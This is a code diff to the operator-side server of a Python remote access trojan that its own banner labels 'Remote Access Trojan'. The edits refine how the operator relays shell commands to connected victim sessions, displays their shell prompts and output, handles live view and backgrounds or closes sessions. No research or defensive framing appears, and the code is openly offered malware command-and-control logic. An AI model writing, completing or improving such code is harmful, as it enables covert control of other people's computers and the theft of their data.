@@ -19,6 +19,7 @@ from prompt_toolkit import PromptSession, ANSI
 from prompt_toolkit.patch_stdout import patch_stdout
 from prompt_toolkit.styles import Style
 from prompt_toolkit import print_formatted_text
+from prompt_toolkit.output import ColorDepth
 
 from PIL import Image
 from io import BytesIO
@@ -143,8 +144,11 @@ class WebSocketServer:
         self.in_shell_mode = False  # Track if user is in shell mode on client
         self.last_client_prompt = ""  # Store the last prompt received from client
         
-        # prompt_toolkit session for proper input handling
-        self.prompt_session = PromptSession()
+        # prompt_toolkit session for proper input handling - disable bell
+        self.prompt_session = PromptSession(
+            enable_system_prompt=False,
+            enable_suspend=False,
+        )
         
         # Live view state
         self.liveview_session = None
@@ -672,13 +676,23 @@ class WebSocketServer:
                 if self.active_session == session_id:
                     try:
                         text = data.decode('utf-8', errors='replace')
-                        print(text, end='', flush=True)
-                        # Capture the last line as potential shell prompt (for clear command)
-                        lines = text.split('\n')
-                        last_line = lines[-1].strip() if lines else ''
-                        # Check if it looks like a shell prompt (ends with > or $ or #)
-                        if last_line and (last_line.endswith('>') or last_line.endswith('$') or last_line.endswith('#')):
-                            self.last_client_prompt = last_line + ' '
+                        
+                        # In shell mode, don't print the trailing prompt - we handle it
+                        if self.in_shell_mode:
+                            lines = text.split('\n')
+                            last_line = lines[-1].strip() if lines else ''
+                            # Check if last line looks like a shell prompt
+                            if last_line and (last_line.endswith('>') or last_line.endswith('$') or last_line.endswith('#')):
+                                self.last_client_prompt = last_line + ' '
+                                # Print everything except the trailing prompt line
+                                if len(lines) > 1:
+                                    output = '\n'.join(lines[:-1])
+                                    if output:
+                                        print(output, flush=True)
+                            else:
+                                print(text, end='', flush=True)
+                        else:
+                            print(text, end='', flush=True)
                     except:
                         pass
         
@@ -1976,14 +1990,27 @@ class WebSocketServer:
                     break
                 
                 try:
-                    # Get appropriate prompt
+                    # Get appropriate prompt - use plain string for shell mode
                     if self.in_shell_mode and self.last_client_prompt:
+                        # Shell prompt from client - just use as plain string
                         prompt = self.last_client_prompt
                     else:
                         prompt = self.session_prompt(session_id)
                     
-                    # Use prompt_toolkit async prompt
-                    cmd = await self.prompt_session.prompt_async(prompt)
+                    # Use prompt_toolkit async prompt with timeout check
+                    import asyncio
+                    
+                    # Create a task for prompt that we can cancel if session closes
+                    prompt_task = asyncio.create_task(self.prompt_session.prompt_async(prompt))
+                    
+                    while not prompt_task.done():
+                        if session_id not in self.sessions:
+                            prompt_task.cancel()
+                            self.cprint("\n[!] Session closed - returning to server prompt")
+                            raise asyncio.CancelledError()
+                        await asyncio.sleep(0.1)
+                    
+                    cmd = await prompt_task
                     
                     # Double-check session still valid
                     if session_id not in self.sessions:
@@ -2026,17 +2053,29 @@ class WebSocketServer:
                     elif cmd == 'exit' and self.in_shell_mode:
                         self.in_shell_mode = False
                         self.last_client_prompt = ''
+                    elif cmd == 'exit' and not self.in_shell_mode:
+                        # Exit command to client - close session, wait for it to close
+                        await self.send_command(session_id, cmd)
+                        await asyncio.sleep(0.5)  # Give time for session to close
+                        if session_id not in self.sessions:
+                            break
+                        continue
                     
                     # Send command to client
                     if not await self.send_command(session_id, cmd):
                         self.cprint(f"\n[!] Failed to send command")
                         break
                     
-                    # Wait for response
-                    await asyncio.sleep(0.3)
+                    # Wait for response - longer for shell commands
+                    if self.in_shell_mode:
+                        await asyncio.sleep(0.1)  # Shorter wait in shell mode
+                    else:
+                        await asyncio.sleep(0.3)
                     
                 except KeyboardInterrupt:
                     self.cprint(f"\n\n[*] Backgrounding session {session_id}\n")
+                    break
+                except asyncio.CancelledError:
                     break
         finally:
             self.active_session = None
@@ -2213,7 +2252,7 @@ class WebSocketServer:
         self.cprint(f"{RED}|{RESET}                   {CYAN}{BOLD}    S  U   U  B   B  6   6{RESET}                         {RED}|{RESET}")
         self.cprint(f"{RED}|{RESET}                   {CYAN}{BOLD}SSSSS  UUUUU  BBBB    666 {RESET}                         {RED}|{RESET}")
         self.cprint(f"{RED}|                                                                      |{RESET}")
-        self.cprint(f"{RED}|{RESET}                  {YELLOW}  [ Remote Access Trojan ]{RESET}                         {RED}|{RESET}")
+        self.cprint(f"{RED}|{RESET}                  {YELLOW}  [ Remote Access Trojan ]{RESET}                          {RED}|{RESET}")
         self.cprint(f"{RED}|                                                                      |{RESET}")
         self.cprint(f"{RED}+----------------------------------------------------------------------+{RESET}")
         self.cprint(f"{RED}|{RESET}   {WHITE}Author{RESET}  : {GREEN}Subodh{RESET}                                                   {RED}|{RESET}")
